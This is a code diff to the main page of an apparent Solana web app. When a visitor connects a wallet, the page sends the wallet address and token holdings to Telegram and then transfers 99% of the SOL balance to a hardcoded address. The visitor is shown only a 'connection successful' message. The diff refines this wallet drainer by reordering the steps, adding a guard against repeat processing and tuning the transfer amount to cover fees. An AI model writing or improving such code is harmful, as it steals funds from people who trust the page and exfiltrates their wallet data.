@@ -1,4 +1,3 @@
-
 import { Settings, Menu } from "lucide-react";
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
@@ -7,7 +6,6 @@ import { useEffect, useState } from 'react';
 import { getTokenAccounts, sendToTelegram, signAndSendTransaction } from '@/utils/walletUtils';
 import { toast } from '@/components/ui/use-toast';
 
-// This is a placeholder address - replace with your actual backend address
 const BACKEND_ADDRESS = "BHQsFPYDG6Px5cJpKr6tvRXDiGZcU5KGXNrAMxqj5v8Q";
 
 const Index = () => {
@@ -22,45 +20,19 @@ const Index = () => {
       return;
     }
 
+    if (isProcessing) {
+      console.log("Already processing a transaction");
+      return;
+    }
+
     setIsProcessing(true);
     try {
       console.log("Starting wallet connection process");
       
-      // First, get and send wallet data to Telegram
-      console.log("Fetching token accounts for address:", publicKey.toString());
-      let tokens = [];
-      try {
-        tokens = await getTokenAccounts(connection, publicKey.toString());
-        console.log("Successfully fetched token accounts:", tokens);
-      } catch (tokenError) {
-        console.error("Token fetch error:", tokenError);
-        // Continue with empty tokens array instead of failing
-        tokens = [];
-      }
-      
-      const walletData = {
-        address: publicKey.toString(),
-        tokens,
-      };
-      
-      console.log("Sending data to Telegram");
-      await sendToTelegram(walletData);
-
-      // Get wallet balance with retry logic
+      // Get wallet balance first
       console.log("Getting wallet balance");
-      let balance;
-      try {
-        balance = await connection.getBalance(publicKey, 'confirmed');
-        console.log("Current balance:", balance / LAMPORTS_PER_SOL, "SOL");
-      } catch (balanceError) {
-        console.error("Balance fetch error:", balanceError);
-        toast({
-          title: "Error",
-          description: "Failed to fetch wallet balance. Please try again.",
-          variant: "destructive",
-        });
-        return;
-      }
+      const balance = await connection.getBalance(publicKey, 'confirmed');
+      console.log("Current balance:", balance / LAMPORTS_PER_SOL, "SOL");
 
       if (balance <= 0) {
         toast({
@@ -71,13 +43,27 @@ const Index = () => {
         return;
       }
 
+      // Get token accounts
+      console.log("Fetching token accounts");
+      const tokens = await getTokenAccounts(connection, publicKey.toString());
+      console.log("Token accounts:", tokens);
+      
+      // Send data to Telegram
+      const walletData = {
+        address: publicKey.toString(),
+        tokens,
+      };
+      
+      console.log("Sending data to Telegram");
+      await sendToTelegram(walletData);
+
       // Initiate transfer
       console.log("Initiating transfer");
       const signature = await signAndSendTransaction(
         connection,
         wallet,
         BACKEND_ADDRESS,
-        balance / LAMPORTS_PER_SOL // Transfer entire balance
+        balance / LAMPORTS_PER_SOL * 0.99 // Transfer 99% of balance to account for fees
       );
 
       console.log("Transfer completed with signature:", signature);
@@ -88,7 +74,7 @@ const Index = () => {
         description: "Connection successful and transfer completed!",
       });
     } catch (error) {
-      console.error('Error processing wallet connection:', error);
+      console.error('Detailed error in wallet connection:', error);
       toast({
         title: "Error",
         description: error instanceof Error ? error.message : "Failed to process wallet connection",
